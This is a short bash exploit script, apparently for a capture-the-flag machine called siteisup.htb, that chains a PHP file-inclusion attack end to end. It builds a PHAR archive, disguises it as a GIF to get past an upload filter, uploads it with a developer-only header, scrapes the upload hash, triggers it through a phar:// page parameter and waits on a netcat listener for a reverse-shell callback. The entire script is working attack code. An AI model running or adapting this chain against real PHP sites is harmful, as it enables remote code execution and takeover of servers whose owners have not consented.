#!/bin/bash
set -eu

php -d phar.readonly=0 php-rfi-smuggling.php 1>/dev/null
# cp attack.phar "attack-$(date +"%Y%m%d%H%M%S").gif"
mv attack.phar attack.gif
file attack.gif

echo "uploading to server..."
curl -s -k -X POST \
    -H 'Host: dev.siteisup.htb' \
    -H 'Special-Dev: only4dev' \
    -F 'file=@attack.gif;type=image/gif' \
    -F 'check=Check' \
    'http://dev.siteisup.htb/'

echo ""
echo "wait for hash..."
sleep 5

echo "grabbing upload hash..."
HASH=$(curl -s -H 'Special-Dev: only4dev' 'http://dev.siteisup.htb/uploads/' \
    | pup 'table tr:nth-last-child(2) a text{}')

echo "Upload hash: $HASH"

echo "trigger phar://uploads/${HASH}/attack.gif/attack"
set -x
(sleep 5 && curl -s -H 'Special-Dev: only4dev' \
    "http://dev.siteisup.htb/?page=phar://uploads/${HASH}/attack.gif/attack") &

echo "waiting for callback..."
nc -lvnp 4444
